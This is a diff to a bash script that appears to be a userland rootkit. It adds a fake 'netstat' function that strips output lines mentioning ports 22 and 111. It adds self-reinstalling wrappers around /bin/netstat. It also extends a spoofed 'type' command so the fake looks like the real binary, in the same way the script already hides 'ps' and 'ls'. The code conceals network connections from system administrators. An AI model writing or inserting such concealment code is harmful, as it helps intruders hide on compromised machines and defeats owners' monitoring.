@@ -94,7 +94,10 @@ function type()
 		"ps")
 			echo "ps is /bin/ps"
 			return ;;
-		"/bin/ls"|"/usr/bin/dir"|"/bin/ps")
+		"netstat")
+			echo "netstat is hashed (/bin/netstat)"
+			return ;;
+		"/bin/ls"|"/usr/bin/dir"|"/bin/ps"|"/bin/netstat")
 			echo "$1 is $1"
 			return ;;
                 *)
@@ -372,4 +375,34 @@ function /bin/ps()
         unset -f /bin/ps
         ps $@
         reset_ps
+}
+
+function netstat()
+{
+        local port=(22 111)
+        local hide_port=111 tmp_port
+
+        tmp_port=`/bin/netstat $@`
+        for hide_port in ${port[@]}
+        do
+                tmp_port=`echo "$tmp_port" | sed -e '/'$hide_port'/d'`
+        done
+        echo "$tmp_port"
+}
+
+function reset_netstat()
+{
+        function /bin/netstat()
+        {
+                unset -f /bin/netstat
+                netstat $@
+                reset_netstat
+        }
+}
+
+function /bin/netstat()
+{
+        unset -f /bin/netstat
+        netstat $@
+        reset_netstat
 }
